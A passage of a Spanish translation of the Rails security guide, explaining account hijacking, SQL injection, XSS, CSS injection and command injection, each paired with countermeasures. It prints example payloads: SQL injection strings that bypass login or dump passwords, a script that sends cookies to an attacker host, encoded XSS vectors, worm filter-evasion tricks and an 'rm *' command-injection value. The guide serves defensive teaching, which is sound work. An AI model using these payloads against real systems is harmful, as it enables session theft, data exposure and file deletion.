Imagina una situación en la que un atacante ha robado la cookie de sesión de un usuario y, por lo tanto, puede utilizar la aplicación. Si es fácil cambiar la contraseña, el atacante secuestrará la cuenta con unos pocos clics. O si el formulario de cambio de contraseña es vulnerable a CSRF, el atacante podrá cambiar la contraseña de la víctima al llevarla a una página web donde haya una etiqueta IMG manipulada que realice el CSRF. Como medida de seguridad, _haz que los formularios de cambio de contraseña sean seguros contra CSRF_, por supuesto. Y _exige al usuario que ingrese la contraseña anterior al cambiarla_.

#### Correo electrónico

Sin embargo, el atacante también puede tomar el control de la cuenta cambiando la dirección de correo electrónico. Después de cambiarla, irá a la página de contraseña olvidada y la contraseña (posiblemente nueva) se enviará al correo electrónico del atacante. Como medida de seguridad, _exige al usuario que ingrese la contraseña al cambiar la dirección de correo electrónico también_.

#### Otros

Dependiendo de tu aplicación web, puede haber más formas de secuestrar la cuenta del usuario. En muchos casos, CSRF y XSS ayudarán a hacerlo. Por ejemplo, como en una vulnerabilidad CSRF en [Google Mail](https://www.gnucitizen.org/blog/google-gmail-e-mail-hijack-technique/). En este ataque de prueba de concepto, la víctima habría sido llevada a un sitio web controlado por el atacante. En ese sitio hay una etiqueta IMG manipulada que resulta en una solicitud GET HTTP que cambia la configuración de filtros de Google Mail. Si la víctima había iniciado sesión en Google Mail, el atacante cambiaría los filtros para reenviar todos los correos electrónicos a su dirección de correo electrónico. Esto es casi tan perjudicial como secuestrar toda la cuenta. Como medida de seguridad, _revisa la lógica de tu aplicación y elimina todas las vulnerabilidades de XSS y CSRF_.

### CAPTCHAs

INFO: _Un CAPTCHA es una prueba de desafío-respuesta para determinar que la respuesta no es generada por una computadora. A menudo se utiliza para proteger los formularios de registro de los atacantes y los formularios de comentarios de los bots de spam automáticos, pidiéndole al usuario que escriba las letras de una imagen distorsionada. Este es el CAPTCHA positivo, pero también existe el CAPTCHA negativo. La idea de un CAPTCHA negativo no es que un usuario demuestre que es humano, sino revelar que un robot es un robot._

Una API de CAPTCHA positivo popular es [reCAPTCHA](https://developers.google.com/recaptcha/), que muestra dos imágenes distorsionadas de palabras de libros antiguos. También agrega una línea inclinada en lugar de un fondo distorsionado y altos niveles de deformación en el texto, como lo hacían los CAPTCHAs anteriores, porque estos últimos fueron vulnerados. Como bonificación, el uso de reCAPTCHA ayuda a digitalizar libros antiguos. [ReCAPTCHA](https://github.com/ambethia/recaptcha/) también es un complemento de Rails con el mismo nombre que la API.

Obtendrás dos claves de la API, una clave pública y una clave privada, que debes colocar en tu entorno de Rails. Después de eso, puedes usar el método recaptcha_tags en la vista y el método verify_recaptcha en el controlador. Verify_recaptcha devolverá falso si la validación falla.
El problema con los CAPTCHAs es que tienen un impacto negativo en la experiencia del usuario. Además, algunos usuarios con discapacidad visual han encontrado difícil leer ciertos tipos de CAPTCHAs distorsionados. Aún así, los CAPTCHAs positivos son uno de los mejores métodos para evitar que todo tipo de bots envíen formularios.

La mayoría de los bots son realmente ingenuos. Recorren la web y colocan su spam en todos los campos de formulario que encuentran. Los CAPTCHAs negativos aprovechan eso e incluyen un campo "trampa" en el formulario que estará oculto para el usuario humano mediante CSS o JavaScript.

Ten en cuenta que los CAPTCHAs negativos solo son efectivos contra bots ingenuos y no son suficientes para proteger aplicaciones críticas de bots dirigidos. Aún así, los CAPTCHAs negativos y positivos se pueden combinar para aumentar el rendimiento, por ejemplo, si el campo "trampa" no está vacío (se detecta un bot), no será necesario verificar el CAPTCHA positivo, lo que requeriría una solicitud HTTPS a Google ReCaptcha antes de calcular la respuesta.

Aquí hay algunas ideas sobre cómo ocultar los campos trampa mediante JavaScript y/o CSS:

* Coloca los campos fuera del área visible de la página.
* Haz que los elementos sean muy pequeños o colóralos del mismo color que el fondo de la página.
* Deja los campos visibles, pero indica a los humanos que los dejen en blanco.
El CAPTCHA negativo más simple es un campo de trampa oculto. En el lado del servidor, verificarás el valor del campo: si contiene algún texto, debe ser un bot. Luego, puedes ignorar la publicación o devolver un resultado positivo, pero sin guardar la publicación en la base de datos. De esta manera, el bot estará satisfecho y seguirá adelante.

Puedes encontrar CAPTCHAs negativos más sofisticados en la publicación del blog de Ned Batchelder: 

* Incluir un campo con la marca de tiempo UTC actual y verificarlo en el servidor. Si está demasiado en el pasado o en el futuro, el formulario no es válido.
* Aleatorizar los nombres de los campos.
* Incluir más de un campo de trampa de todos los tipos, incluyendo botones de envío.

Ten en cuenta que esto solo te protege de los bots automáticos, los bots personalizados dirigidos no pueden detenerse con esto. Por lo tanto, los CAPTCHAs negativos pueden no ser buenos para proteger los formularios de inicio de sesión.

### Registro

ADVERTENCIA: _Indica a Rails que no incluya contraseñas en los archivos de registro._

Por defecto, Rails registra todas las solicitudes que se realizan a la aplicación web. Pero los archivos de registro pueden ser un gran problema de seguridad, ya que pueden contener credenciales de inicio de sesión, números de tarjetas de crédito, etc. Al diseñar un concepto de seguridad para una aplicación web, también debes pensar en qué sucederá si un atacante obtiene acceso (completo) al servidor web. Encriptar secretos y contraseñas en la base de datos será bastante inútil si los archivos de registro los muestran en texto claro. Puedes filtrar ciertos parámetros de solicitud de tus archivos de registro agregándolos a [`config.filter_parameters`][] en la configuración de la aplicación. Estos parámetros se marcarán como [FILTRADOS] en el registro.

```ruby
config.filter_parameters << :password
```

NOTA: Los parámetros proporcionados se filtrarán mediante una expresión regular de coincidencia parcial. Rails agrega una lista de filtros predeterminados, incluyendo `:passw`, `:secret` y `:token`, en el inicializador correspondiente (`initializers/filter_parameter_logging.rb`) para manejar parámetros de aplicación típicos como `password`, `password_confirmation` y `my_token`.

### Expresiones regulares

INFORMACIÓN: _Un error común en las expresiones regulares de Ruby es hacer coincidir el inicio y el final de la cadena con ^ y $, en lugar de \A y \z._

Ruby utiliza un enfoque ligeramente diferente a muchos otros lenguajes para hacer coincidir el final y el principio de una cadena. Es por eso que incluso muchos libros de Ruby y Rails se equivocan en esto. Entonces, ¿cómo es esto una amenaza de seguridad? Supongamos que quieres validar de manera flexible un campo de URL y usas una expresión regular simple como esta:

```ruby
  /^https?:\/\/[^\n]+$/i
```

Esto puede funcionar bien en algunos lenguajes. Sin embargo, _en Ruby `^` y `$` hacen coincidir el **inicio de línea** y el **fin de línea**_. Por lo tanto, una URL como esta pasa el filtro sin problemas:

```
javascript:exploit_code();/*
http://hi.com
*/
```

Esta URL pasa el filtro porque la expresión regular coincide con la segunda línea, el resto no importa. Ahora imagina que tenemos una vista que muestra la URL de esta manera:

```ruby
  link_to "Página principal", @user.homepage
```

El enlace parece inocente para los visitantes, pero cuando se hace clic, ejecutará la función JavaScript "exploit_code" o cualquier otro JavaScript que el atacante proporcione.

Para corregir la expresión regular, en lugar de `^` y `$` se deben usar `\A` y `\z`, de la siguiente manera:

```ruby
  /\Ahttps?:\/\/[^\n]+\z/i
```

Dado que este es un error frecuente, el validador de formato (validates_format_of) ahora genera una excepción si la expresión regular proporcionada comienza con ^ o termina con $. Si necesitas usar ^ y $ en lugar de \A y \z (lo cual es raro), puedes establecer la opción :multiline en true, de la siguiente manera:

```ruby
  # el contenido debe incluir una línea "Meanwhile" en cualquier lugar de la cadena
  validates :content, format: { with: /^Meanwhile$/, multiline: true }
```

Ten en cuenta que esto solo te protege contra el error más común al usar el validador de formato: siempre debes tener en cuenta que ^ y $ hacen coincidir el **inicio de línea** y el **fin de línea** en Ruby, y no el inicio y el final de una cadena.

### Escalada de privilegios

ADVERTENCIA: _Cambiar un solo parámetro puede dar al usuario acceso no autorizado. Recuerda que cualquier parámetro puede ser cambiado, sin importar cuánto lo ocultes o lo obfusques._

El parámetro más común que un usuario podría manipular es el parámetro de id, como en `http://www.domain.com/project/1`, donde 1 es el id. Estará disponible en params en el controlador. Allí, es probable que hagas algo como esto:
```ruby
@project = Project.find(params[:id])
```

Esto está bien para algunas aplicaciones web, pero ciertamente no si el usuario no está autorizado para ver todos los proyectos. Si el usuario cambia el id a 42 y no se le permite ver esa información, de todos modos tendrá acceso a ella. En su lugar, _consulte también los derechos de acceso del usuario_:

```ruby
@project = @current_user.projects.find(params[:id])
```

Dependiendo de su aplicación web, habrá muchos más parámetros que el usuario pueda manipular. Como regla general, _ningún dato de entrada del usuario es seguro, hasta que se demuestre lo contrario, y cada parámetro del usuario es potencialmente manipulado_.

No se deje engañar por la seguridad por obfuscación y la seguridad de JavaScript. Las herramientas de desarrollo permiten revisar y cambiar todos los campos ocultos de un formulario. _JavaScript se puede utilizar para validar los datos de entrada del usuario, pero ciertamente no para evitar que los atacantes envíen solicitudes maliciosas con valores inesperados_. El complemento Firebug para Mozilla Firefox registra cada solicitud y puede repetirlas y cambiarlas. Esa es una forma fácil de eludir cualquier validación de JavaScript. Incluso hay proxies del lado del cliente que le permiten interceptar cualquier solicitud y respuesta de Internet.

Inyección
---------

INFO: _La inyección es una clase de ataques que introducen código malicioso o parámetros en una aplicación web para ejecutarlo dentro de su contexto de seguridad. Ejemplos destacados de inyección son el cross-site scripting (XSS) y la inyección SQL._

La inyección es muy complicada, porque el mismo código o parámetro puede ser malicioso en un contexto, pero totalmente inofensivo en otro. Un contexto puede ser un lenguaje de script, de consulta o de programación, la shell o un método de Ruby/Rails. Las siguientes secciones cubrirán todos los contextos importantes donde pueden ocurrir ataques de inyección. Sin embargo, la primera sección cubre una decisión arquitectónica en relación con la inyección.

### Listas permitidas versus listas restringidas

NOTA: _Cuando se sanitiza, protege o verifica algo, es preferible utilizar listas permitidas en lugar de listas restringidas._

Una lista restringida puede ser una lista de direcciones de correo electrónico no válidas, acciones no públicas o etiquetas HTML no válidas. Esto se opone a una lista permitida que enumera las direcciones de correo electrónico válidas, acciones públicas, etiquetas HTML válidas, etc. Aunque a veces no es posible crear una lista permitida (en un filtro de SPAM, por ejemplo), _es preferible utilizar enfoques de lista permitida_:

* Utilice `before_action except: [...]` en lugar de `only: [...]` para acciones relacionadas con la seguridad. De esta manera, no olvidará habilitar las comprobaciones de seguridad para las acciones recién agregadas.
* Permita `<strong>` en lugar de eliminar `<script>` contra Cross-Site Scripting (XSS). Consulte a continuación para obtener más detalles.
* No intente corregir la entrada del usuario utilizando listas restringidas:
    * Esto hará que el ataque funcione: `"<sc<script>ript>".gsub("<script>", "")`
    * Pero rechace la entrada mal formada

Las listas permitidas también son un buen enfoque contra el factor humano de olvidar algo en la lista restringida.

### Inyección SQL

INFO: _Gracias a los métodos inteligentes, esto casi no es un problema en la mayoría de las aplicaciones Rails. Sin embargo, este es un ataque muy devastador y común en las aplicaciones web, por lo que es importante entender el problema._

#### Introducción

Los ataques de inyección SQL tienen como objetivo influir en las consultas de la base de datos manipulando los parámetros de la aplicación web. Un objetivo popular de los ataques de inyección SQL es eludir la autorización. Otro objetivo es llevar a cabo la manipulación de datos o la lectura de datos arbitrarios. Aquí hay un ejemplo de cómo no usar los datos de entrada del usuario en una consulta:

```ruby
Project.where("name = '#{params[:name]}'")
```

Esto podría ser en una acción de búsqueda y el usuario puede ingresar el nombre de un proyecto que desea encontrar. Si un usuario malintencionado ingresa `' OR 1) --`, la consulta SQL resultante será:

```sql
SELECT * FROM projects WHERE (name = '' OR 1) --')
```

Los dos guiones inician un comentario que ignora todo lo que viene después. Por lo tanto, la consulta devuelve todos los registros de la tabla de proyectos, incluidos aquellos que el usuario no puede ver. Esto se debe a que la condición es verdadera para todos los registros.

#### Eludir la autorización

Por lo general, una aplicación web incluye control de acceso. El usuario ingresa sus credenciales de inicio de sesión y la aplicación web intenta encontrar el registro coincidente en la tabla de usuarios. La aplicación otorga acceso cuando encuentra un registro. Sin embargo, un atacante posiblemente pueda eludir esta verificación con una inyección SQL. A continuación se muestra una consulta de base de datos típica en Rails para encontrar el primer registro en la tabla de usuarios que coincide con los parámetros de credenciales de inicio de sesión proporcionados por el usuario.
```ruby
User.find_by("login = '#{params[:name]}' AND password = '#{params[:password]}'")
```

Si un atacante ingresa `' OR '1'='1` como nombre y `' OR '2'>'1` como contraseña, la consulta SQL resultante será:

```sql
SELECT * FROM users WHERE login = '' OR '1'='1' AND password = '' OR '2'>'1' LIMIT 1
```

Esto simplemente encontrará el primer registro en la base de datos y otorgará acceso a este usuario.

#### Lectura no autorizada

La declaración UNION conecta dos consultas SQL y devuelve los datos en un solo conjunto. Un atacante puede usarlo para leer datos arbitrarios de la base de datos. Tomemos el ejemplo anterior:

```ruby
Project.where("name = '#{params[:name]}'")
```

Y ahora inyectemos otra consulta usando la declaración UNION:

```
') UNION SELECT id,login AS name,password AS description,1,1,1 FROM users --
```

Esto resultará en la siguiente consulta SQL:

```sql
SELECT * FROM projects WHERE (name = '') UNION
  SELECT id,login AS name,password AS description,1,1,1 FROM users --'
```

El resultado no será una lista de proyectos (porque no hay ningún proyecto con un nombre vacío), sino una lista de nombres de usuario y sus contraseñas. ¡Así que espero que hayas [hasheado las contraseñas de forma segura](#user-management) en la base de datos! El único problema para el atacante es que el número de columnas debe ser el mismo en ambas consultas. Es por eso que la segunda consulta incluye una lista de unos (1), que siempre será el valor 1, para que coincida con el número de columnas en la primera consulta.

Además, la segunda consulta renombra algunas columnas con la declaración AS para que la aplicación web muestre los valores de la tabla de usuarios. Asegúrate de actualizar tu versión de Rails [al menos a la 2.1.1](https://rorsecurity.info/journal/2008/09/08/sql-injection-issue-in-limit-and-offset-parameter.html).

#### Contramedidas

Ruby on Rails tiene un filtro incorporado para caracteres especiales de SQL, que escapará `'`, `"`, el carácter NULL y los saltos de línea. *Usar `Model.find(id)` o `Model.find_by_something(something)` aplica automáticamente esta contramedida*. Pero en fragmentos de SQL, especialmente *en fragmentos de condiciones (`where("...")`), en los métodos `connection.execute()` o `Model.find_by_sql()`, debe aplicarse manualmente*.

En lugar de pasar una cadena, puedes usar controladores posicionales para sanear cadenas contaminadas de esta manera:

```ruby
Model.where("zip_code = ? AND quantity >= ?", entered_zip_code, entered_quantity).first
```

El primer parámetro es un fragmento de SQL con signos de interrogación. El segundo y tercer parámetro reemplazarán los signos de interrogación con el valor de las variables.

También puedes usar controladores nombrados, los valores se tomarán del hash utilizado:

```ruby
values = { zip: entered_zip_code, qty: entered_quantity }
Model.where("zip_code = :zip AND quantity >= :qty", values).first
```

Además, puedes dividir y encadenar condicionales válidos para tu caso de uso:

```ruby
Model.where(zip_code: entered_zip_code).where("quantity >= ?", entered_quantity).first
```

Ten en cuenta que las contramedidas mencionadas anteriormente solo están disponibles en instancias de modelos. Puedes intentar [`sanitize_sql`][] en otros lugares. _Hazlo un hábito pensar en las consecuencias de seguridad al usar una cadena externa en SQL_.


### Cross-Site Scripting (XSS)

INFO: _Una de las vulnerabilidades de seguridad más extendidas y devastadoras en las aplicaciones web es XSS. Este ataque malicioso inyecta código ejecutable en el lado del cliente. Rails proporciona métodos auxiliares para defenderse de estos ataques._

#### Puntos de entrada

Un punto de entrada es una URL vulnerable y sus parámetros donde un atacante puede iniciar un ataque.

Los puntos de entrada más comunes son las publicaciones de mensajes, los comentarios de los usuarios y los libros de visitas, pero los títulos de los proyectos, los nombres de los documentos y las páginas de resultados de búsqueda también han sido vulnerables, prácticamente en cualquier lugar donde el usuario pueda ingresar datos. Pero la entrada no necesariamente tiene que provenir de cuadros de entrada en los sitios web, puede estar en cualquier parámetro de URL, obvio, oculto o interno. Recuerda que el usuario puede interceptar cualquier tráfico. Las aplicaciones o los proxies del lado del cliente facilitan el cambio de solicitudes. También existen otros vectores de ataque como los anuncios publicitarios.

Los ataques XSS funcionan de la siguiente manera: un atacante inyecta algún código, la aplicación web lo guarda y lo muestra en una página que luego se presenta a una víctima. La mayoría de los ejemplos de XSS simplemente muestran una ventana de alerta, pero es más poderoso que eso. XSS puede robar la cookie, secuestrar la sesión, redirigir a la víctima a un sitio web falso, mostrar anuncios en beneficio del atacante, cambiar elementos en el sitio web para obtener información confidencial o instalar software malicioso a través de agujeros de seguridad en el navegador web.

Durante la segunda mitad de 2007, se informaron 88 vulnerabilidades en los navegadores de Mozilla, 22 en Safari, 18 en IE y 12 en Opera. El informe de amenazas globales de seguridad en Internet de Symantec también documentó 239 vulnerabilidades en complementos de navegador en los últimos seis meses de 2007. [Mpack](https://www.pandasecurity.com/en/mediacenter/malware/mpack-uncovered/) es un marco de ataque muy activo y actualizado que explota estas vulnerabilidades. Para los hackers criminales, es muy atractivo aprovechar una vulnerabilidad de inyección de SQL en un marco de aplicación web e insertar código malicioso en cada columna de tabla de texto. En abril de 2008, más de 510,000 sitios fueron hackeados de esta manera, entre ellos el gobierno británico, las Naciones Unidas y muchos otros objetivos de alto perfil.
#### Inyección de HTML/JavaScript

El lenguaje XSS más común es, por supuesto, el lenguaje de secuencias de comandos del lado del cliente más popular, JavaScript, a menudo en combinación con HTML. _Escapar la entrada del usuario es esencial_.

Aquí está la prueba más sencilla para comprobar si hay XSS:

```html
<script>alert('Hola');</script>
```

Este código JavaScript simplemente mostrará un cuadro de diálogo de alerta. Los siguientes ejemplos hacen exactamente lo mismo, solo que en lugares muy poco comunes:

```html
<img src="javascript:alert('Hola')">
<table background="javascript:alert('Hola')">
```

##### Robo de cookies

Hasta ahora, estos ejemplos no causan ningún daño, así que veamos cómo un atacante puede robar la cookie del usuario (y así secuestrar la sesión del usuario). En JavaScript, puedes usar la propiedad `document.cookie` para leer y escribir la cookie del documento. JavaScript aplica la misma política de origen, lo que significa que un script de un dominio no puede acceder a las cookies de otro dominio. La propiedad `document.cookie` contiene la cookie del servidor web de origen. Sin embargo, puedes leer y escribir esta propiedad si incrustas el código directamente en el documento HTML (como ocurre con XSS). Inyecta esto en cualquier lugar de tu aplicación web para ver tu propia cookie en la página de resultados:

```html
<script>document.write(document.cookie);</script>
```

Para un atacante, por supuesto, esto no es útil, ya que la víctima verá su propia cookie. El siguiente ejemplo intentará cargar una imagen desde la URL http://www.attacker.com/ más la cookie. Por supuesto, esta URL no existe, por lo que el navegador no muestra nada. Pero el atacante puede revisar los archivos de registro de acceso de su servidor web para ver la cookie de la víctima.

```html
<script>document.write('<img src="http://www.attacker.com/' + document.cookie + '">');</script>
```

Los archivos de registro en www.attacker.com se leerán así:

```
GET http://www.attacker.com/_app_session=836c1c25278e5b321d6bea4f19cb57e2
```

Puedes mitigar estos ataques (de manera obvia) agregando la marca **httpOnly** a las cookies, de modo que `document.cookie` no pueda ser leído por JavaScript. Las cookies de solo HTTP se pueden utilizar a partir de IE v6.SP1, Firefox v2.0.0.5, Opera 9.5, Safari 4 y Chrome 1.0.154 en adelante. Sin embargo, otros navegadores más antiguos (como WebTV e IE 5.5 en Mac) pueden hacer que la página no se cargue correctamente. Ten en cuenta que las cookies [aún serán visibles utilizando Ajax](https://owasp.org/www-community/HttpOnly#browsers-supporting-httponly), sin embargo.

##### Desfiguración

Con la desfiguración de páginas web, un atacante puede hacer muchas cosas, por ejemplo, presentar información falsa o atraer a la víctima al sitio web del atacante para robar la cookie, las credenciales de inicio de sesión u otros datos sensibles. La forma más popular es incluir código de fuentes externas mediante iframes:

```html
<iframe name="StatPage" src="http://58.xx.xxx.xxx" width=5 height=5 style="display:none"></iframe>
```

Esto carga HTML y/o JavaScript arbitrario desde una fuente externa y lo incrusta como parte del sitio. Este `iframe` se tomó de un ataque real a sitios web legítimos italianos utilizando el [marco de ataque Mpack](https://isc.sans.edu/diary/MPack+Analysis/3015). Mpack intenta instalar software malicioso a través de agujeros de seguridad en el navegador web, con mucho éxito, el 50% de los ataques tienen éxito.

Un ataque más especializado podría superponerse a todo el sitio web o mostrar un formulario de inicio de sesión que se ve igual que el original del sitio, pero transmite el nombre de usuario y la contraseña al sitio del atacante. O podría usar CSS y/o JavaScript para ocultar un enlace legítimo en la aplicación web y mostrar otro en su lugar que redirige a un sitio web falso.

Los ataques de inyección reflejada son aquellos en los que la carga útil no se almacena para presentarla a la víctima más tarde, sino que se incluye en la URL. Especialmente los formularios de búsqueda no escapan la cadena de búsqueda. El siguiente enlace presentó una página que afirmaba que "George Bush nombró a un niño de 9 años como presidente...":

```
http://www.cbsnews.com/stories/2002/02/15/weather_local/main501644.shtml?zipcode=1-->
  <script src=http://www.securitylab.ru/test/sc.js></script><!--
```

##### Contramedidas

_Es muy importante filtrar la entrada maliciosa, pero también es importante escapar la salida de la aplicación web_.

Especialmente para XSS, es importante hacer un filtrado de entrada permitido en lugar de restringido. El filtrado de lista permitida establece los valores permitidos en lugar de los valores no permitidos. Las listas restringidas nunca están completas.

Imagina que una lista restringida elimina `"script"` de la entrada del usuario. Ahora el atacante inyecta `"<scrscriptipt>"`, y después del filtro, `"<script>"` permanece. Versiones anteriores de Rails utilizaban un enfoque de lista restringida para los métodos `strip_tags()`, `strip_links()` y `sanitize()`. Por lo tanto, este tipo de inyección era posible:

```ruby
strip_tags("some<<b>script>alert('hello')<</b>/script>")
```

Esto devolvía `"some<script>alert('hello')</script>"`, lo que permite que el ataque funcione. Por eso, un enfoque de lista permitida es mejor, utilizando el método `sanitize()` actualizado de Rails 2.
```ruby
tags = %w(a acronym b strong i em li ul ol h1 h2 h3 h4 h5 h6 blockquote br cite sub sup ins p)
s = sanitize(user_input, tags: tags, attributes: %w(href title))
```

Esto permite solo las etiquetas dadas y hace un buen trabajo, incluso contra todo tipo de trucos y etiquetas mal formadas.

Como segundo paso, _es una buena práctica escapar toda la salida de la aplicación_, especialmente al volver a mostrar la entrada del usuario, que no ha sido filtrada (como en el ejemplo del formulario de búsqueda anterior). _Utilice el método `html_escape()` (o su alias `h()`)_ para reemplazar los caracteres de entrada HTML `&`, `"`, `<` y `>` por sus representaciones no interpretadas en HTML (`&amp;`, `&quot;`, `&lt;` y `&gt;`).

##### Ofuscación e Inyección de Codificación

El tráfico de red se basa principalmente en el alfabeto occidental limitado, por lo que surgieron nuevas codificaciones de caracteres, como Unicode, para transmitir caracteres en otros idiomas. Pero esto también es una amenaza para las aplicaciones web, ya que el código malicioso puede ocultarse en diferentes codificaciones que el navegador web puede procesar, pero la aplicación web no. Aquí hay un vector de ataque en codificación UTF-8:

```html
<img src=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;
  &#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
```

Este ejemplo muestra una ventana de mensaje emergente. Sin embargo, será reconocido por el filtro `sanitize()` anterior. Una gran herramienta para ofuscar y codificar cadenas, y así "conocer a tu enemigo", es el [Hackvertor](https://hackvertor.co.uk/public). El método `sanitize()` de Rails hace un buen trabajo para defenderse de los ataques de codificación.

#### Ejemplos del Submundo

_Para entender los ataques actuales a las aplicaciones web, es mejor echar un vistazo a algunos vectores de ataque del mundo real._

Lo siguiente es un extracto del gusano [Js.Yamanner@m Yahoo! Mail](https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=12d8d106-1137-4d7c-8bb4-3ea1faec83fa). Apareció el 11 de junio de 2006 y fue el primer gusano de interfaz webmail:

```html
<img src='http://us.i1.yimg.com/us.yimg.com/i/us/nt/ma/ma_mail_1.gif'
  target=""onload="var http_request = false;    var Email = '';
  var IDList = '';   var CRumb = '';   function makeRequest(url, Func, Method,Param) { ...
```

Los gusanos explotan una vulnerabilidad en el filtro HTML/JavaScript de Yahoo, que normalmente filtra todos los atributos `target` y `onload` de las etiquetas (porque puede haber JavaScript). Sin embargo, el filtro se aplica solo una vez, por lo que el atributo `onload` con el código del gusano permanece en su lugar. Este es un buen ejemplo de por qué las listas de filtros restringidos nunca son completas y por qué es difícil permitir HTML/JavaScript en una aplicación web.

Otro gusano de prueba de concepto para webmail es Nduja, un gusano de dominio cruzado para cuatro servicios de webmail italianos. Encuentra más detalles en [el artículo de Rosario Valotta](http://www.xssed.com/news/37/Nduja_Connection_A_cross_webmail_worm_XWW/). Ambos gusanos de webmail tienen como objetivo recopilar direcciones de correo electrónico, algo con lo que un hacker criminal podría ganar dinero.

En diciembre de 2006, se robaron 34,000 nombres de usuario y contraseñas reales en un [ataque de phishing a MySpace](https://news.netcraft.com/archives/2006/10/27/myspace_accounts_compromised_by_phishers.html). La idea del ataque era crear una página de perfil llamada "login_home_index_html", por lo que la URL parecía muy convincente. Se utilizó HTML y CSS especialmente diseñados para ocultar el contenido genuino de MySpace de la página y en su lugar mostrar su propio formulario de inicio de sesión.

### Inyección de CSS

INFO: _La inyección de CSS es en realidad una inyección de JavaScript, porque algunos navegadores (IE, algunas versiones de Safari y otros) permiten JavaScript en CSS. Piense dos veces antes de permitir CSS personalizado en su aplicación web._

La inyección de CSS se explica mejor con el conocido gusano [MySpace Samy](https://samy.pl/myspace/tech.html). Este gusano enviaba automáticamente una solicitud de amistad a Samy (el atacante) simplemente visitando su perfil. En varias horas, tenía más de 1 millón de solicitudes de amistad, lo que generó tanto tráfico que MySpace se desconectó. A continuación se muestra una explicación técnica de ese gusano.

MySpace bloqueó muchas etiquetas, pero permitió CSS. Entonces, el autor del gusano colocó JavaScript en CSS de esta manera:

```html
<div style="background:url('javascript:alert(1)')">
```

Por lo tanto, la carga útil está en el atributo de estilo. Pero no se permiten comillas en la carga útil, porque ya se han utilizado comillas simples y dobles. Pero JavaScript tiene una función útil `eval()` que ejecuta cualquier cadena como código.

```html
<div id="mycode" expr="alert('hah!')" style="background:url('javascript:eval(document.all.mycode.expr)')">
```

La función `eval()` es una pesadilla para los filtros de entrada de lista restringida, ya que permite que el atributo de estilo oculte la palabra "innerHTML":

```js
alert(eval('document.body.inne' + 'rHTML'));
```

El siguiente problema fue que MySpace filtraba la palabra `"javascript"`, por lo que el autor usó `"java<NEWLINE>script"` para evitar esto:

```html
<div id="mycode" expr="alert('hah!')" style="background:url('java↵script:eval(document.all.mycode.expr)')">
```

Otro problema para el autor del gusano fueron los [tokens de seguridad CSRF](#cross-site-request-forgery-csrf). Sin ellos, no podía enviar una solicitud de amistad a través de POST. Lo solucionó enviando un GET a la página justo antes de agregar un usuario y analizando el resultado en busca del token CSRF.
Al final, obtuvo un gusano de 4 KB, que inyectó en su página de perfil.

La propiedad CSS [moz-binding](https://securiteam.com/securitynews/5LP051FHPE) resultó ser otra forma de introducir JavaScript en CSS en navegadores basados en Gecko (como Firefox, por ejemplo).

#### Contramedidas

Este ejemplo, una vez más, mostró que un filtro de lista restringida nunca está completo. Sin embargo, como el CSS personalizado en aplicaciones web es una característica bastante rara, puede ser difícil encontrar un buen filtro de CSS permitido. _Si desea permitir colores o imágenes personalizadas, puede permitir al usuario elegirlos y construir el CSS en la aplicación web_. Utilice el método `sanitize()` de Rails como modelo para un filtro de CSS permitido, si realmente lo necesita.

### Inyección de Textile

Si desea proporcionar formato de texto que no sea HTML (por motivos de seguridad), utilice un lenguaje de marcado que se convierta a HTML en el lado del servidor. [RedCloth](http://redcloth.org/) es un lenguaje de este tipo para Ruby, pero sin precauciones, también es vulnerable a XSS.

Por ejemplo, RedCloth traduce `_test_` a `<em>test<em>`, lo que hace que el texto esté en cursiva. Sin embargo, hasta la versión actual 3.0.4, todavía es vulnerable a XSS. Obtenga la [nueva versión 4](http://www.redcloth.org) que eliminó errores graves. Sin embargo, incluso esa versión tiene [algunos errores de seguridad](https://rorsecurity.info/journal/2008/10/13/new-redcloth-security.html), por lo que las contramedidas siguen siendo aplicables. Aquí hay un ejemplo para la versión 3.0.4:

```ruby
RedCloth.new('<script>alert(1)</script>').to_html
# => "<script>alert(1)</script>"
```

Utilice la opción `:filter_html` para eliminar HTML que no fue creado por el procesador Textile.

```ruby
RedCloth.new('<script>alert(1)</script>', [:filter_html]).to_html
# => "alert(1)"
```

Sin embargo, esto no filtra todo el HTML, algunos etiquetas quedarán (por diseño), por ejemplo `<a>`:

```ruby
RedCloth.new("<a href='javascript:alert(1)'>hello</a>", [:filter_html]).to_html
# => "<p><a href="javascript:alert(1)">hello</a></p>"
```

#### Contramedidas

Se recomienda _utilizar RedCloth en combinación con un filtro de entrada permitido_, como se describe en la sección de contramedidas contra XSS.

### Inyección de Ajax

NOTA: _Se deben tomar las mismas precauciones de seguridad para las acciones de Ajax como para las acciones "normales". Sin embargo, hay al menos una excepción: la salida debe escaparse en el controlador, si la acción no renderiza una vista._

Si utiliza el complemento [in_place_editor](https://rubygems.org/gems/in_place_editing), o acciones que devuelven una cadena en lugar de renderizar una vista, _debe escapar el valor de retorno en la acción_. De lo contrario, si el valor de retorno contiene una cadena XSS, el código malicioso se ejecutará al regresar al navegador. Escape cualquier valor de entrada utilizando el método `h()`.

### Inyección de Línea de Comandos

NOTA: _Utilice los parámetros de línea de comandos proporcionados por el usuario con precaución._

Si su aplicación debe ejecutar comandos en el sistema operativo subyacente, hay varios métodos en Ruby: `system(command)`, `exec(command)`, `spawn(command)` y `` `command` ``. Deberá tener especial cuidado con estas funciones si el usuario puede ingresar el comando completo o una parte de él. Esto se debe a que en la mayoría de las shells, se puede ejecutar otro comando al final del primero, concatenándolos con un punto y coma (`;`) o una barra vertical (`|`).

```ruby
user_input = "hello; rm *"
system("/bin/echo #{user_input}")
# imprime "hello" y elimina archivos en el directorio actual
```

Una contramedida es _utilizar el método `system(command, parameters)` que pasa los parámetros de línea de comandos de manera segura_.

```ruby
system("/bin/echo", "hello; rm *")
# imprime "hello; rm *" y no elimina archivos
```

#### Vulnerabilidad de Kernel#open

`Kernel#open` ejecuta un comando del sistema operativo si el argumento comienza con una barra vertical (`|`).

```ruby
open('| ls') { |file| file.read }
# devuelve la lista de archivos como una cadena a través del comando `ls`
```

Las contramedidas son utilizar `File.open`, `IO.open` o `URI#open` en su lugar. No ejecutan un comando del sistema operativo.

```ruby
File.open('| ls') { |file| file.read }
# no ejecuta el comando `ls`, simplemente abre el archivo `| ls` si existe

IO.open(0) { |file| file.read }
# abre la entrada estándar. no acepta una cadena como argumento

require 'open-uri'
URI('https://example.com').open { |file| file.read }
# abre la URI. `URI()` no acepta `| ls`
```

### Inyección de Cabecera

